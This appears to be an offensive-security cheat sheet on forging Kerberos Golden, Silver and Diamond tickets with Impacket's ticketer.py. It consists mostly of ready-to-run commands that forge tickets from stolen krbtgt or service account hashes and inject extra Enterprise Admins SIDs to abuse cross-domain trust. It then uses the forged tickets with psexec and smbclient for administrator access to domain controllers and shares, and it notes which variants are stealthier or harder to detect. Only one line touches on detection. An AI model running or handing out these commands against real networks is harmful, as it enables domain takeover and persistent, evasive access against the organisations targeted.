# 07.11 ticketer.py Golden Silver Diamond Tickets

> Forge Golden (krbtgt), Silver (service hash), or Diamond (modified-real) tickets offline with `ticketer.py`.

## Overview

ticketer.py forges Kerberos tickets offline. Golden ticket: forged TGT using krbtgt hash — valid for any service. Silver ticket: forged TGS for a specific SPN using the service account hash. Diamond ticket: requests a real TGT then modifies it — harder to detect.

## Steps

- Golden ticket: requires krbtgt NT hash or AES256 key + domain SID
- Silver ticket: requires service account NT hash + domain SID + target SPN
- Extra SIDs (-extra-sid): add parent domain SID-519 for cross-domain trust abuse
- Default ticket lifetime 10 years; detection: look for abnormal ticket lifetimes
- Diamond ticket: -request flag + real account creds — requests then encrypts with known key
- Domain SID: Get-DomainSID in PowerView, or from secretsdump output header

## Commands

### Golden Ticket (NT hash)

```bash
impacket-ticketer -nthash <KRBTGT_NTHASH> -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX -domain DOMAIN.LOCAL Administrator
export KRB5CCNAME=$(pwd)/Administrator.ccache
impacket-psexec -k -no-pass DOMAIN.LOCAL/Administrator@DC01.DOMAIN.LOCAL
```

### Golden Ticket (AES256 — stealthier)

```bash
impacket-ticketer -aesKey <KRBTGT_AES256> -domain-sid S-1-5-21-... -domain DOMAIN.LOCAL Administrator
```

### Golden Ticket with Extra SIDs (cross-domain)

```bash
# Add Enterprise Admins SID of parent domain to forge cross-domain access
impacket-ticketer -nthash <KRBTGT_CHILD_HASH> -domain-sid S-1-5-21-CHILD-SID -domain CHILD.DOMAIN.LOCAL -extra-sid S-1-5-21-PARENT-SID-519 Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass DOMAIN.LOCAL/Administrator@PARENTDC.DOMAIN.LOCAL
```

### Silver Ticket (CIFS service)

```bash
impacket-ticketer -nthash <SERVICE_NTHASH> -domain-sid S-1-5-21-... -domain DOMAIN.LOCAL -spn cifs/TARGET.DOMAIN.LOCAL Administrator
export KRB5CCNAME=Administrator.ccache
impacket-smbclient -k -no-pass DOMAIN.LOCAL/Administrator@TARGET.DOMAIN.LOCAL
```

### Silver Ticket (HOST service — PSExec)

```bash
impacket-ticketer -nthash <COMPUTER_NTHASH> -domain-sid S-1-5-21-... -domain DOMAIN.LOCAL -spn host/TARGET.DOMAIN.LOCAL Administrator
```

### Diamond Ticket (harder to detect)

```bash
impacket-ticketer -request -user anyuser -password 'P@ss' -nthash <KRBTGT_NTHASH> -aesKey <KRBTGT_AES256> -domain-sid S-1-5-21-... -domain DOMAIN.LOCAL Administrator
```
